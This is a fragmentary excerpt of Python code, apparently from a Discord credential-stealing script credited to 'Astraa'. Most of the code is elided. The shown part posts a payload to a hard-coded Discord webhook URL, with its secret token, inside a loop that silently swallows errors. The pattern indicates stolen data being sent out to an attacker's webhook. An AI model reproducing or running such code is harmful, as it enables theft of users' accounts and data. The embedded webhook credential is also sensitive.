...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1418871922317328424/EvfxkVTkp6Yu97o07zeHI-LxTlDP6IIB-J4VfYOAa7gCNh9cJHaxxFm93XsXcAlWsWV6', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
